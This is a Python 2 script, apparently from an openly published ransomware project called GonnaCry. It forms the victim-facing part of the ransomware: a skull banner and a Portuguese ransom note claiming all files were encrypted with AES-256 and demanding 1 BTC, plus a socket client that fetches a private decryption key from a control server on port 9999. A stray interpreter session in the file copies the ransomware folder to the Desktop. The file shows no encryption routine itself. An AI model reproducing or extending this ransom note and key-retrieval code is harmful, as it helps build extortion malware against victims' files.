#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
import os, socket

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

skull = '''
   .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .

        \33[93mTODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
                    digite 'help' para obter ajuda
'''
ajuda='''
Olá, todos os seus arquivos importantes foram criptografados.
Para te-los de volta você precisa efetuar um pagamento de 1 BTC
Brincadeira, apenas digite 1.
'''

def bitcoin_addr():
    a = 0

'''
>>> shutil.copytree('Ransomware','~/Desktop/GonnaCry')
>>> shutil.copytree('Ransomware','/home/tarcisio/Desktop/GonnaCry')
>>> shutil.copytree('Ransomware',os.environ['HOME']+'Desktop/GonnaCry')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'os' is not defined
>>> import o
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ImportError: No module named o
>>> import os
>>> shutil.copytree('Ransomware',os.environ['HOME']+'Desktop/GonnaCry')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/shutil.py", line 177, in copytree
    os.makedirs(dst)
  File "/usr/lib/python2.7/os.py", line 150, in makedirs
    makedirs(head, mode)
  File "/usr/lib/python2.7/os.py", line 157, in makedirs
    mkdir(name, mode)
OSError: [Errno 13] Permission denied: '/home/tarcisioDesktop'
>>> shutil.copytree('Ransomware',os.environ['HOME']+'/Desktop/GonnaCry')
>>>



'''


def identificador(pergunta):
    os.system('clear')
    if(pergunta == 'ajuda' or pergunta == 'help'):
        print(ajuda)

    elif(pergunta == '1' or pergunta == 'sim' or pergunta == 's'):
        conect_to_serv()


def conect_to_serv(IP_serv = 'localhost'):
    f = open('caminho_gc.txt','r')
    caminho = f.read()
    if(os.path.isdir(caminho)):
        os.chdir(caminho)
        os.listdir(os.getcwd())

    try:
        s = socket.socket()
        s.connect((IP_serv,9999))
    except socket.error as e:
        print('Erro de conexão: '+str(e))
        print('Tente mais tarde')
        exit()
    l = s.recv(1024)
    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
    while (l):
        f.write(l)
        l = s.recv(1024)
    f.close()
    s.close()


def chat():
    while True:
        try:
            pergunta = raw_input('\33[94m~> \033[0m')
            identificador(pergunta.lower())
        except KeyboardInterrupt:
            a = raw_input('deseja sair? ')
            if(a == 'sim' or a == 's' or a == '1'):
                exit()

if __name__ == '__main__':
    os.system('clear')
    print('{0}'+skull+'{1}').format(RED,GREEN)
    chat()
